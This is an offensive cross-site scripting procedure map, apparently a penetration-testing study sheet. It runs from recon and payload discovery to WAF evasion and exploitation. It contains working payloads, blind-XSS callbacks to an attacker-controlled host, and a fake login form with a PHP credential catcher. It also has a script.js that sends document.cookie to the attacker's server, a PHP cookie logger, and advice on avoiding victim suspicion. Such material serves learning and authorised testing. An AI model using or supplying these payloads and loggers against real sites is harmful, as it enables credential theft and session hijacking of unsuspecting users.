Cross-Site Scripting (XSS)

Full procedure map — from recon to exploitation

1
Recon — identify inputs
Map the attack surface before testing anything
›
Find all input fields
View page source to locate every input: form fields, URL params, HTTP headers (Cookie, User-Agent).
curl -s http://TARGET/ | grep -i "input\|name=\|action="
Submit the form first
Get a fully populated URL with all params (e.g. ?fullname=test&username=test&email=test@test.com). Tools like XSStrike fail if params are tested individually when the app requires all fields present.
Identify the HTML context
View source to see how your input renders. This determines the breakout:

<img src='INPUT'> → breakout: '>
<input value="INPUT"> → breakout: ">
<div>INPUT</div> → no breakout needed, bare <script> works
2
Discovery — find the XSS
Automated + manual testing to confirm vulnerability
›
Automated scanning
XSStrike:
python xsstrike.py -u "URL?param=test"

Also: Nessus, Burp Pro, ZAP

Look for: "Reflections found", Efficiency: 100, Confidence: 10
Manual testing
PayloadAllTheThings, Payload-Box

Basic: <script>alert(1)</script>
Event handler: <img src=x onerror=alert(1)>
Encoded: <HtMl%09onPoIntERENTER+=+confirm()>
Blind XSS detection
When you can't see the output (admin panels, support tickets), use remote script callbacks with field name in URL path:
<script src=http://YOUR_IP:PORT/fieldname></script> "><script src=http://YOUR_IP:PORT/fieldname></script> '><script src=http://YOUR_IP:PORT/fieldname></script>
Whichever field name appears in your listener = that's the vulnerable field.
Always verify manually
Automated tools give false negatives. XSStrike saying "No reflection" doesn't mean it's safe — the app may need all params present, or the breakout context may be unusual.
3
Classify — what type of XSS?
Determines the delivery method and exploit path
›
Reflected
Input reflects in response via URL params. Does not persist. Victim must click a crafted URL.

Test: Change param value → see if it appears in response → inject payload via URL.
Stored
Input persists in DB (comments, profiles, tickets). Fires every time the page loads. Most dangerous — no victim interaction needed after injection.
DOM-based
Client-side JS processes input unsafely (source → sink). Never hits the server. Look for: innerHTML, document.write, eval(), location.hash
Blind
Triggers on a page you can't see (admin panel). Detect via out-of-band callbacks to your server. Higher success rate with DOM XSS sinks.
4
Craft payload — match the context
Breakout + vector + evasion + cleanup
›
1. Breakout
Close the current HTML context to inject your own code:

Single-quoted attr: '>  |  Double-quoted attr: ">  |  Unquoted/text: bare tag
2. Injection vector
<script> tags — most basic, most filtered
Event handlers — onerror, onmouseover, onpointerenter, onfocus
Remote script — <script src=http://IP/script.js> — most flexible, payload lives on your server
3. WAF/filter evasion
Mixed case: OnPoIntERENTER
URL-encoded whitespace: %09 (tab), %0a (newline), %0d (carriage return)
Alternate alert functions: confirm(), prompt()
Alternate tags: <details>, <svg>, <a>, <d3V>
4. Page cleanup
Remove original elements: document.getElementById('formId').remove();
Comment out leftover HTML: <!-- at the end of payload
5
Exploit — phishing or session hijacking
Two attack paths to steal credentials or cookies
›
Path A — Phishing (credential theft)
Goal: Inject a fake login form that sends creds to your server

1. Use document.write() to inject a fake form with action=http://YOUR_IP:PORT
2. Clean up the page: document.getElementById('formId').remove() + <!--
3. Host PHP cred catcher:
<?php if (isset($_GET['username']) && isset($_GET['password'])) { $file = fopen("creds.txt", "a+"); fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n"); header("Location: http://TARGET/original-page"); fclose($file); exit(); } ?>
4. Deliver malicious URL via app's sharing feature or social engineering
5. cat creds.txt → login as victim
Path B — Session hijacking (cookie theft)
Goal: Steal victim's session cookie and impersonate them

1. Create script.js:
new Image().src='http://YOUR_IP:PORT/index.php?c='+document.cookie;
2. Host PHP cookie logger:
<?php if (isset($_GET['c'])) { $list = explode(";", $_GET['c']); foreach ($list as $key => $value) { $cookie = urldecode($value); $file = fopen("cookies.txt", "a+"); fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n"); fclose($file); } } ?>
3. Start PHP server: sudo php -S 0.0.0.0:PORT
4. Inject: "><script src=http://YOUR_IP:PORT/script.js></script>
5. cat cookies.txt → set cookie in browser (Shift+F9 → Storage → +) → refresh = logged in as victim
Why PHP over netcat?
Netcat catches the request but returns an error to the victim (suspicious). The PHP script logs silently and redirects the victim back to the real page — no suspicion raised.
